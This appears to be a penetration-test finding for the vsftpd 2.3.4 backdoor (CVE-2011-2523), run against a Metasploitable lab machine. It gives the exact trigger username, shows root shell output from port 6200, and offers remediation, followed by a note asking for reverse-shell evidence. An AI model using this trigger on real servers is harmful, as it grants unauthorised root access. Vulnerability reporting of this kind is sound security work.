title: vsftpd 2.3.4 Backdoor Command Execution (CVE-2011-2523)
description: The vsftpd 2.3.4 FTP server contains a backdoor that opens a root shell on TCP port 6200 when a username containing ':)' is sent during authentication. This was a supply-chain compromise of the vsftpd source code. Exploitation provides immediate uid=0(root) access.
evidence:
Triggered backdoor by sending 'USER backdoor:)' to FTP port 21, then connected to port 6200:

220 (vsFTPd 2.3.4)
331 Please specify the password.

Backdoor shell on port 6200:
uid=0(root) gid=0(root)
root
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
remediation: Upgrade vsftpd to a version later than 2.3.4 obtained from a trusted source. Verify package integrity with checksums.

suggestions: For RCE: Show command output (whoami, id, hostname)
Include reverse shell session or command injection output
